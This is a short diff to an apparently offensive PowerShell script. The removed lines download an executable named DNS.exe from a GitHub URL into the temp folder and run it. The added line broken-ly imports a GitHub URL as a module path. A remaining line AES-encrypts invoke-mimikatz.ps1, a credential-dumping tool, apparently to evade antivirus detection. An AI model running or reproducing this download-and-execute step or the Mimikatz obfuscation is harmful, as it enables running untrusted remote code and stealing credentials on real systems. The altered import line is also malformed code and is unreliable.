@@ -1,6 +1,2 @@
-$url = 'https://raw.githubusercontent.com/FREAKMANCHIK/WORK/main/files/DNS.exe'
-$outputPath = "$env:TEMP\DNS.exe"
-Invoke-WebRequest -Uri $url -OutFile $outputPath
-Start-Process -FilePath $outputPath
-Import-Module ./AES-Encoder.ps1
+Import-Module ./https://github.com/FREAKMANCHIK/WORK/blob/main/files/DNS.exe
 Invoke-AES-Encoder -InFile invoke-mimikatz.ps1 -OutFile aesmimi.ps1
